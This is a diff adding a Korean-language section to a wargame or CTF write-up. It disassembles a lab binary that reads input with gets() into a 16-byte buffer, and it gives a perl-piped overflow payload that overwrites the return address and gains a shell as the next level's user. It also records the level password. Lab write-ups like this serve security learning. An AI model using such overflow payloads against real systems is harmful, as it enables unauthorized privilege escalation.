@@ -116,6 +116,36 @@ uid=1002(lv2) gid=1001(lv1) groups=1001(lv1)
 
 알아낸 lv2 비번 : tooo easy
 ## lv 2
+gdb로 lv3가 무슨 프로그램인지 확인해보자.
+```
+   0x080483f8 <+0>:	push   ebp
+   0x080483f9 <+1>:	mov    ebp,esp
+   0x080483fb <+3>:	sub    esp,0x10
+   0x080483fe <+6>:	lea    eax,[ebp-0x10]
+   0x08048401 <+9>:	push   eax
+   0x08048402 <+10>:	call   0x804830c <gets@plt>
+   0x08048407 <+15>:	add    esp,0x4
+   0x0804840a <+18>:	lea    eax,[ebp-0x10]
+   0x0804840d <+21>:	push   eax
+   0x0804840e <+22>:	push   0x8048470
+   0x08048413 <+27>:	call   0x804833c <printf@plt>
+   0x08048418 <+32>:	add    esp,0x8
+   0x0804841b <+35>:	leave  
+   0x0804841c <+36>:	ret
+   ```
+lv3는 그 전과는 다르게 strcpy가 아닌 gets함수로 문자를 입력받게된다.   
+마찬가지로 16바이트만큼 담을 수 있으며 초과부분은 ebp를 지나 ret까지 침범하게된다.  
+
+그 전 문제들과는 같게 풀어주되 이번에는 ./lv3를 실행시킬때 파이프라인을 이용하자.  
+```
+lv2@ubuntu:~$ (perl -e 'print "a"x20, "\x8c\xda\xff\xff"';cat) | ./lv3
+id
+aaaaaaaaaaaaaaaaaaaa����id
+id
+uid=1003(lv3) gid=1002(lv2) groups=1002(lv2)
+```
+
+알아낸 lv2 비번 : i dont like stdin
 
 ## lv 3
 ## lv 4
